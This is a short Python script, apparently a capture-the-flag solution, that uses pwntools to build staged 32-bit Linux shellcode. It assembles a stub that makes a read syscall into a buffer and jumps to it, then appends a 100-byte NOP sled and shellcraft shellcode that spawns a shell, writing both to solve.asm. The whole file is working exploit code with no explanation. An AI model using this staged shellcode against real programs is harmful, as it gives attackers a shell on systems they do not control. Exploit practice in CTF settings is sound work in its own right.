#!/usr/bin/env python3
from pwn import *

sc = '''
mov al, 3
mov edx, 0xff
xor ebx, ebx
int 0x80
nop
nop
nop
nop
nop
push ecx
ret
'''

sc2 = asm(sc, vma=0x08048000, shared=False, arch='i686', os='linux')
print(sc2)
print(disasm(sc2))

sc3 = b'\x90' * 100 + asm(shellcraft.sh(), arch='i686', os='linux')


with open('solve.asm', 'wb') as f:
    f.write(sc2)
    f.write(sc3)
